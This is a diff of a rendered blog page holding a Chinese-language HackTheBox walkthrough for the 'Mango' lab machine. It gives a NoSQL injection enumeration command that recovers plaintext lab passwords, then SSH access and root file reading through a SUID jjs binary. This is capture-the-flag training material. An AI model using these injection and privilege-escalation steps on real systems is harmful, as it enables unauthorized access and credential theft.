@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息lab地址： https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;214  10.10.10.162  端口扫描 80 绑定hosts访问后是这个：  443  证书信息是staging-order.mango.htb，可以加到hosts里  Nosql injection80登录界面其实是nosql，可以用这个 https:&#x2F;&#x2F;github.c">
+    <meta name="description" content="基本信息lab地址： https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;214  10.10.10.162  端口扫描                                                                                                            80">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mango - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/04/17/Mango-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息lab地址： https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;214  10.10.10.162  端口扫描 80 绑定hosts访问后是这个：  443  证书信息是staging-order.mango.htb，可以加到hosts里  Nosql injection80登录界面其实是nosql，可以用这个 https:&#x2F;&#x2F;github.c">
+<meta property="og:description" content="基本信息lab地址： https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;214  10.10.10.162  端口扫描                                                                                                            80">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041701.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041702.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041704.jpg">
@@ -126,7 +126,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -216,18 +216,55 @@
 <ul>
 <li><h2 id="10-10-10-162"><a href="#10-10-10-162" class="headerlink" title="10.10.10.162"></a>10.10.10.162</h2></li>
 </ul>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041701.jpg" alt=""></p>
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041702.jpg" alt=""></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>绑定hosts访问后是这个：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041704.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="443"><a href="#443" class="headerlink" title="443"></a>443</h2><p>  证书信息是staging-order.mango.htb，可以加到hosts里</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041703.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Nosql-injection"><a href="#Nosql-injection" class="headerlink" title="Nosql injection"></a>Nosql injection</h1><p>80登录界面其实是nosql，可以用这个</p>
 <p><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" target="_blank" rel="noopener">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login -m POST</span><br></pre></td></tr></table></figure>
 
 <p> 得到两个用户名：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>同样的方法注入出password：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login -m POST</span><br><span class="line"></span><br><span class="line">2 password(s) found:</span><br><span class="line">h3mXK8RhU~f&#123;]f5H</span><br><span class="line"><span class="meta">t9KcS3&gt;</span><span class="bash">!0B<span class="comment">#2</span></span></span><br></pre></td></tr></table></figure>
 
@@ -235,11 +272,34 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mango:h3mXK8RhU~f&#123;]f5H</span><br><span class="line">admin:t9KcS3&gt;!0B#2</span><br></pre></td></tr></table></figure>
 
 <p>admin不能直接SSH登录，可以使用<code>mango:h3mXK8RhU~f{]f5H</code>可以登录SSH, user.txt在admin用户目录中：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>使用admin账号密码切换到admin，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041707.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>使用<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>收集信息，发现可能利用的JJS</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041708.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>JJS具有SUID，直接使用JJS执行代码，读取root.txt:</p>
 <p><a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/home/admin$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line"><span class="meta">jjs&gt;</span><span class="bash"> var BufferedReader = Java.type(<span class="string">"java.io.BufferedReader"</span>);</span></span><br><span class="line"><span class="meta">jjs&gt;</span><span class="bash"> var FileReader = Java.type(<span class="string">"java.io.FileReader"</span>);</span></span><br><span class="line"><span class="meta">jjs&gt;</span><span class="bash"> var br = new BufferedReader(new FileReader(<span class="string">"/root/root.txt"</span>));</span></span><br><span class="line"><span class="meta">jjs&gt;</span><span class="bash"> <span class="keyword">while</span> ((line = br.readLine()) != null) &#123; <span class="built_in">print</span>(line); &#125;</span></span><br><span class="line">8a8ef79a7a2fbb01ea81688424e9ab15</span><br><span class="line"><span class="meta">jjs&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
